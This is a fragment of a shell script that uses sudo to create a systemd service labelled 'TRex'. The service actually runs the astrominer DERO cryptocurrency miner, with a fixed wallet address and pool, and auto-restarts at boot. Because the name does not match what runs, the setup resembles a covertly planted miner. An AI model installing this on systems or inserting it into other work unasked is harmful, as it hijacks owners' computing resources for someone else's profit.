...
then
	...
	sudo bash -c "echo -e \"[Unit]\nDescription=TRex\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/astrominer-w dero1qysa0885hxkw2hklh2vem6jzyt6yzdnl44e4504eak23mkwlwfppvqqtwx76e -m 15 -p rpc -r community-pools.mysrv.cloud:10300\n\n[Install]\nWantedBy=multi-user.target\" > /etc/systemd/system/trex.service"
